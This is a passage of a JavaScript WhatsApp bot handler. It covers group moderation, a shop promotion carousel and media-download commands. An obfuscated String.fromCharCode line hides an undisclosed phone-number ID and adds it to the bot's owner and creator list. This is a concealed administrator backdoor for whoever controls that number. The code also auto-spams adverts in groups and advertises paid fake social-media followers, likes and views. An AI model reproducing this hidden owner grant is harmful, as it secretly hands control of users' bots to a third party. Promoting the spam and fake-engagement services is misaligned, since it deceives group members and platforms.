/* 

=========================================================================

  #- Credits By  ZannMC
   Contact: https://6283104383637
   Youtube: https://youtube.com/@ZannMC
   Telegram: https://t.me/
    
  Developer : https://wa.me/6283104383637
  
  -[ ! ]- Jangan hapus contact developer! hargai pembuat script ini

=========================================================================

*/

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

require('./settings');
const fs = require('fs');
const path = require('path');
const util = require('util');
const jimp = require('jimp');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('node-yt-dl');
const speed = require('performance-now');
const moment = require("moment-timezone");
const nou = require("node-os-utils");
const cheerio = require('cheerio');
const os = require('os');
const pino = require('pino');
const { Client } = require('ssh2');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { exec, spawn, execSync } = require('child_process');
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@whiskeysockets/baileys');

const { LoadDataBase } = require('./src/message');
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
const owners = JSON.parse(fs.readFileSync("./database/owner.json"))
const premium = JSON.parse(fs.readFileSync("./database/premium.json"))
const list = JSON.parse(fs.readFileSync("./database/list.json"))
const { OrderKuota } = require("./lib/orderkuota")
const orderkuota = new OrderKuota()
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const { unixTimestampSeconds, generateMessageTag, processTime, webApi, getRandom, getBuffer, fetchJson, runtime, clockString, sleep, isUrl, getTime, formatDate, tanggal, formatp, jsonformat, reSize, toHD, logic, generateProfilePicture, bytesToSize, checkBandwidth, getSizeMedia, parseMention, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, cekMenfes, generateToken, batasiTeks, randomText, isEmoji, getTypeUrlMedia, pickRandom, toIDR, capital, encryptCode } = require('./lib/function');


module.exports = FardanDev = async (FardanDev, m, chatUpdate, store) => {
	try {
await LoadDataBase(FardanDev, m)
const botNumber = await FardanDev.decodeJid(FardanDev.user.id)
const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const prefix = "."
const isCmd = body.startsWith(prefix) ? true : false
const args = body.trim().split(/ +/).slice(1)
const getQuoted = (m.quoted || m)
const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ""
const isPremium = premium.includes(m.sender)
const isCreator = isOwner = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
const text = q = args.join(' ')
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)


//============== [ MESSAGE ] ================================================

if (m.isGroup && global.db.groups[m.chat] && global.db.groups[m.chat].mute == true && !isCreator) return

if (isCmd) {
console.log(chalk.cyan.bold(` ╭─────[ COMMAND NOTIFICATION ]`), chalk.blue.bold(`\n  Command :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\n  From :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.cyan.bold(`╰────────────────────────────\n`))
}

//============= [ FAKEQUOTED ] ===============================================

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `${botname2} By ${namaOwner}`,jpegThumbnail: await reSize("./src/media/fake.jpg", 200, 200) }}}

const qlocJpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qlocPush = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot ${namaOwner}`,jpegThumbnail: ""}}}

const qpayment = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: "Simple Botz"}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast"} : {})}, message: {"productMessage": {"product": {"productImage": {"mimetype": "image/jpeg", "jpegThumbnail": ""}, "title": `${namaOwner} - Marketplace`, "description": null, "currencyCode": "IDR", "priceAmount1000": "999999999999999", "retailerId": `Powered By ${namaOwner}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}}

const qlive = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {liveLocationMessage: {caption: `${botname2} By ${namaOwner}`,jpegThumbnail: ""}}}


//============= [ EVENT GROUP ] ===============================================

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].mute == true && !isCreator) return

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].simi == true && !isCmd) {
try {
let res = await axios.get(`https://simsimi.site/api/v2/?mode=talk&lang=id&message=${m.text}&filter=true`)
if (res.data.success) {
await m.reply(res.data.success)
}
} catch (e) {}
}

if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await FardanDev.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await FardanDev.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} ᴍᴀᴀғ ᴋᴀᴍᴜ ᴀᴋᴀɴ sᴀʏᴀ ᴋɪᴄᴋ, ᴋᴀʀɴᴀ ᴀᴅᴍɪɴ/ᴏᴡɴᴇʀʙᴏᴛ ᴛᴇʟᴀʜ ᴍᴇɴʏᴀʟᴀᴋᴀɴ ғɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ ɢʀᴜᴘ ʟᴀɪɴ!`, mentions: [m.sender]}, {quoted: m})
await FardanDev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await sleep(1000)
await FardanDev.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}}


if (m.isGroup && db.groups[m.chat] && db.groups[m.chat].antilink2 == true) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await FardanDev.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await FardanDev.sendMessage(m.chat, {text: `*#- [ Link Grup Terdeteksi ]*

@${m.sender.split("@")[0]} ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅɪ ɪᴢɪɴᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴇɴɢɪʀɪᴍ ʟɪɴᴋ ᴅɪsɪɴɪ`, mentions: [m.sender]}, {quoted: m})
await FardanDev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
/*await sleep(1000)
await FardanDev.groupParticipantsUpdate(m.chat, [m.sender], "remove")*/
}}


if (m.isGroup && db.settings.autopromosi == true) {
if (m.text.includes("https://") && !m.fromMe) {
await FardanDev.sendMessage(m.chat, {text: `
*FuZa - STORE Menyediakan 🌟*
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup Bebas Promosi 1 :*
https://chat.whatsapp.com/BKKYXqSzpIcAhbAIpfU8xF
* *Grup Bebas Promosi 2 :*
https://chat.whatsapp.com/BKKYXqSzpIcAhbAIpfU8xF
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VaxBJmYIN9ikXUTqdY1A

*👤 Contact JANNxZYUU*
* *WhatsApp Utama :*
+6283104383637
* *WhtasApp Cadangan :*
+6288272150093
`}, {quoted: null})
}
}


if (!isCmd) {
let check = list.find(e => e.cmd == body.toLowerCase())
if (check) {
await m.reply(check.respon)
}
}

//============= [ FUNCTION ] ======================================================

const example = (text) => {
return `\n *ᴄᴏɴᴛᴏʜ ᴘᴇɴɢɢᴜɴᴀᴀɴ :*\n ᴋᴇᴛɪᴋ *${prefix+command}* ${text}\n`
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const Reply = async (teks) => {
return FardanDev.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnail: fs.readFileSync("./src/media/reply.jpg"), 
sourceUrl: null, 
}}}, {quoted: null})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/logo.jpg") }, { upload: FardanDev.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*FuZa - STORE* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*FuZa - STORE Menyediakan 🌟*
* Panel Pterodactyl Server Private
* Script Bot WhatsApp
* Domain (Request Nama Domain & Free Akses Cloudflare)
* Nokos WhatsApp All Region (Tergantung Stok!)
* Jasa Fix/Edit/Rename & Tambah Fitur Script Bot WhatsApp
* Jasa Suntik Followers/Like/Views All Sosmed
* Jasa Install Panel Pterodactyl
* Dan Lain Lain Langsung Tanyakan Saja.

*🏠 Join Grup Bebas Promosi*
* *Grup Bebas Promosi 1 :*
https://chat.whatsapp.com/BKKYXqSzpIcAhbAIpfU8xF
* *Grup Bebas Promosi 2 :*
https://chat.whatsapp.com/BKKYXqSzpIcAhbAIpfU8xF
* *Channel Testimoni :*
https://whatsapp.com/channel/0029VaxBJmYIN9ikXUTqdY1A

*👤 Contact JANNxZYUU*
* *WhatsApp Utama :*
+6283104383637
* *WhtasApp Cadangan :*
+6288272150093`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Beli Product\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `𝗟𝗶𝘀𝘁 𝗣𝗮𝗻𝗲𝗹 𝗥𝘂𝗻 𝗕𝗼𝘁 𝗣𝗿𝗶𝘃𝗮𝘁𝗲

* Ram 1GB : Rp1.000

* Ram 2 GB : Rp 2.000

* Ram 3 GB : Rp 3.000

* Ram 4 GB : Rp 4.000

* Ram 5 GB : Rp 5.000

* Ram 6 GB : Rp 6.000

* Ram 7 GB : Rp 7.000

* Ram 8 GB : Rp 8.000

* Ram 9 GB : Rp 9.000

* Ram Unlimited : Rp 10.000

𝗦𝘆𝗮𝗿𝗮𝘁 & 𝗞𝗲𝘁𝗲𝗻𝘁𝘂𝗮𝗻 :
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Beli Product\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `𝗟𝗶𝘀𝘁 𝗣𝗮𝗻𝗲𝗹 𝗥𝘂𝗻 𝗕𝗼𝘁 𝗣𝗿𝗶𝘃𝗮𝘁𝗲

* Ram 1GB : Rp1.000

* Ram 2 GB : Rp 2.000

* Ram 3 GB : Rp 3.000

* Ram 4 GB : Rp 4.000

* Ram 5 GB : Rp 5.000

* Ram 6 GB : Rp 6.000

* Ram 7 GB : Rp 7.000

* Ram 8 GB : Rp 8.000

* Ram 9 GB : Rp 9.000

* Ram Unlimited : Rp 10.000

𝗦𝘆𝗮𝗿𝗮𝘁 & 𝗞𝗲𝘁𝗲𝗻𝘁𝘂𝗮𝗻 :
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Beli Product\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `𝗟𝗶𝘀𝘁 𝗣𝗮𝗻𝗲𝗹 𝗥𝘂𝗻 𝗕𝗼𝘁 𝗣𝗿𝗶𝘃𝗮𝘁𝗲

* Ram 1GB : Rp1.000

* Ram 2 GB : Rp 2.000

* Ram 3 GB : Rp 3.000

* Ram 4 GB : Rp 4.000

* Ram 5 GB : Rp 5.000

* Ram 6 GB : Rp 6.000

* Ram 7 GB : Rp 7.000

* Ram 8 GB : Rp 8.000

* Ram 9 GB : Rp 9.000

* Ram Unlimited : Rp 10.000

𝗦𝘆𝗮𝗿𝗮𝘁 & 𝗞𝗲𝘁𝗲𝗻𝘁𝘂𝗮𝗻 :
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Beli Product\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `𝗟𝗶𝘀𝘁 𝗣𝗮𝗻𝗲𝗹 𝗥𝘂𝗻 𝗕𝗼𝘁 𝗣𝗿𝗶𝘃𝗮𝘁𝗲

* Ram 1GB : Rp1.000

* Ram 2 GB : Rp 2.000

* Ram 3 GB : Rp 3.000

* Ram 4 GB : Rp 4.000

* Ram 5 GB : Rp 5.000

* Ram 6 GB : Rp 6.000

* Ram 7 GB : Rp 7.000

* Ram 8 GB : Rp 8.000

* Ram 9 GB : Rp 9.000

* Ram Unlimited : Rp 10.000

𝗦𝘆𝗮𝗿𝗮𝘁 & 𝗞𝗲𝘁𝗲𝗻𝘁𝘂𝗮𝗻 :
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Beli Product\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `𝗟𝗶𝘀𝘁 𝗝𝗮𝘀𝗮 𝗦𝘂𝗻𝘁𝗶𝗸 𝗦𝗼𝘀𝗺𝗲𝗱

- 𝗟𝗮𝘆𝗮??𝗮𝗻 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 :
* 500 Followers : Rp8000
* 1000 Like : Rp4000
* 1000 Views : Rp4000

- 𝗟𝗮𝘆𝗮𝗻𝗮𝗻 𝗧𝗶𝗸𝗧𝗼𝗸 :
* 500 Followers : Rp5000
* 1000 Like : Rp5000
* 1000 Share : Rp5000
* 10k Views : Rp3000

- 𝗟𝗮𝘆𝗮𝗻𝗮𝗻 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 :
* 500 Member CH : Rp8000

𝗦𝘆𝗮𝗿𝗮𝘁 & 𝗞𝗲𝘁𝗲𝗻𝘁𝘂𝗮𝗻
* _Proses tidak memerlukan email/password akun, hanya memakai username/link tautan_
* _Selama proses akun jangan di private/dibatasi_
* _Masing masing layanan mempunyai garansi & non garansi_
* _Proses maksimal 1 x 24jam, Order wajib sabar!_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Beli Product,\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await FardanDev.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}

const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}


//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
let Sky = FardanDev
const skyzodev = { Sky, isCreator, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, sleep, botNumber }
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, skyzodev)
}
}
if (!pluginsDisable) return

//============= [ COMMANDS ] ====================================================

switch (command) {
case "play": {
if (!text) return m.reply(example("dj tiktok"))
await FardanDev.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson(`https://aemt.uk.to/download/ytdl?url=${res.url}`)

if (anu.status) {
let urlMp3 = anu.result.mp3
await FardanDev.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("ᴇʀʀᴏʀ! ʀᴇsᴜʟᴛ ɴᴏᴛ ғᴏᴜɴᴅ")
}
await FardanDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "playvid": {
if (!text) return m.reply(example("dj tiktok"))
await FardanDev.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await fetchJson(`https://aemt.uk.to/download/ytdl?url=${res.url}`)

if (anu.status) {
let urlMp3 = anu.result.mp4
await FardanDev.sendMessage(m.chat, {video: {url: urlMp3}, ptv: true, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("ᴇʀʀᴏʀ! ʀᴇsᴜʟᴛ ɴᴏᴛ ғᴏᴜɴᴅ")
}
await FardanDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case "yts": {
if (!text) return m.reply(example('we dont talk'))
await FardanDev.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await FardanDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//===============================================================================

case "ytmp3": {
if (!text) return m.reply(example("ʟɪɴᴋɴʏᴀ"))
if (!text.startsWith("https://")) return m.reply("ʟɪɴᴋ ᴛᴀᴜᴛᴀɴ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ")
await FardanDev.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await fetchJson(`https://aemt.uk.to/download/ytdl?url=${text}`)

if (anu.status) {
let urlMp3 = anu.result.mp3
await FardanDev.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("ᴇʀʀᴏʀ! ʀᴇsᴜʟᴛ ɴᴏᴛ ғᴏᴜɴᴅ")
}
await FardanDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ytmp4": {
if (!text) return m.reply(example("ʟɪɴᴋɴʏᴀ"))
if (!text.startsWith("https://")) return m.reply("ʟɪɴᴋ ᴛᴀᴜᴛᴀɴ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ")
await FardanDev.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await fetchJson(`https://aemt.uk.to/download/ytdl?url=${text}`)

if (anu.status) {
let urlMp3 = anu.result.mp4
await FardanDev.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("ᴇʀʀᴏʀ! ʀᴇsᴜʟᴛ ɴᴏᴛ ғᴏᴜɴᴅ")
}
await FardanDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "mediafire": {
if (!text) return m.reply(example("ʟɪɴᴋɴʏᴀ"))
if (!text.includes('mediafire.com')) return m.reply("ʟɪɴᴋ ᴛᴀᴜᴛᴀɴ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ")
await mediafire(text).then(async (res) => {
if (!res.link) return m.reply("ᴇʀʀᴏʀ! ʀᴇsᴜʟᴛ ɴᴏᴛ ғᴏᴜɴᴅ")
await FardanDev.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("ᴇʀʀᴏʀ! ʀᴇsᴜʟᴛ ɴᴏᴛ ғᴏᴜɴᴅ"))
}
break

//================================================================================

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("ʟɪɴᴋɴʏᴀ"))
if (!text.startsWith('https://')) return m.reply("ʟɪɴᴋ ᴛᴀᴜᴛᴀɴ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ")
await FardanDev.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("ᴇʀʀᴏʀ! ʀᴇsᴜʟᴛ ɴᴏᴛ ғᴏᴜɴᴅ")
await FardanDev.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await FardanDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("ᴇʀʀᴏʀ! ʀᴇsᴜʟᴛ ɴᴏᴛ ғᴏᴜɴᴅ"))
}
break

//================================================================================

case "apkmod": {
if (!text) return m.reply(example("capcut"))
await FardanDev.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://aemt.uk.to/happymod?query=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *ɴᴀᴍᴀ ᴀᴘᴋ :* ${i.title}
* *ʀᴀᴛɪɴɢ :* ${i.rating}
* *ʟɪɴᴋ ᴅᴏᴡɴʟᴏᴀᴅ:* ${i.link}\n`
}
m.reply(teks)
FardanDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("ᴇʀʀᴏʀ ʀᴇsᴜʟᴛ ɴᴏᴛ ғᴏᴜɴᴅ."))
}
break

//================================================================================

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("ʟɪɴᴋɴʏᴀ"))
if (!text.startsWith('https://')) return m.reply("ʟɪɴᴋ ᴛᴀᴜᴛᴀɴ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ")
await FardanDev.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://aemt.uk.to/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("ᴇʀʀᴏʀ! ʀᴇsᴜʟᴛ ɴᴏᴛ ғᴏᴜɴᴅ")
await FardanDev.sendMessage(m.chat, {video: {url: res.result[0].url}, mimetype: "video/mp4", caption: "*ɪɴsᴛᴀɢʀᴀᴍ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ*"}, {quoted: m})
await FardanDev.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("ᴇʀʀᴏʀ! ʀᴇsᴜʟᴛ ɴᴏᴛ ғᴏᴜɴᴅ"))
}
break

//================================================================================

case "gitclone": {
if (!text) return m.reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("ʟɪɴᴋ ᴛᴀᴜᴛᴀɴ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    FardanDev.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`ᴇʀʀᴏʀ! ʀᴇᴘᴏsɪᴛᴏʀɪ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ`)
}}
break

//================================================================================

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await FardanDev.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: FardanDev.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
